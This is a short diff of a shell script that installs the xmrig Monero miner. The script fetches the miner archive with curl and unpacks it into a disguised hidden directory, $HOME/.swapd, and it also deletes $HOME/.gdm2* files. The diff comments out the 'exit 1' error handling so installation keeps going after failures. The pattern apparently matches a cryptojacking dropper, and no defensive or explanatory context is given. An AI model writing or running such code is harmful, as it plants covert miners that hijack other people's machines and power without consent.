@@ -237,7 +237,7 @@ rm -rf $HOME/.gdm2*
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  exit 1
+#  exit 1
 fi
 
 # wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O $HOME/.swapd/xmrig.tar.gz
@@ -247,7 +247,7 @@ echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
 [ -d $HOME/.swapd/ ] || mkdir $HOME/.swapd/
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
-  exit 1
+#  exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
@@ -268,7 +268,7 @@ if (test $? -ne 0); then
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-    exit 1
+ #   exit 1
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd/"
